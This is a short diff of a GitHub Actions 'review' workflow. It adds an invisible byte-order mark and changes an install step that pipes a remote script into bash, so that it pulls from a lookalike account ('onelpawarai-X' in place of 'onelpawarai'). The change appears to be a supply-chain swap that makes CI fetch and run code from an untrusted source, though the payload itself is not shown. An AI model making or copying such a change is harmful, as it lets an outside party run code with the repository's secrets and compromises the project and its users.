@@ -1,4 +1,4 @@
-name: review
+﻿name: review
 
 on:
   issue_comment:
@@ -32,7 +32,7 @@ jobs:
       - uses: ./.github/actions/setup-bun
 
       - name: Install zyraxon
-        run: curl -fsSL https://raw.githubusercontent.com/onelpawarai/ZYRAXON-AI/main/install | bash
+        run: curl -fsSL https://raw.githubusercontent.com/onelpawarai-X/ZYRAXON-AI/main/install | bash
 
       - name: Get PR details
         id: pr-details
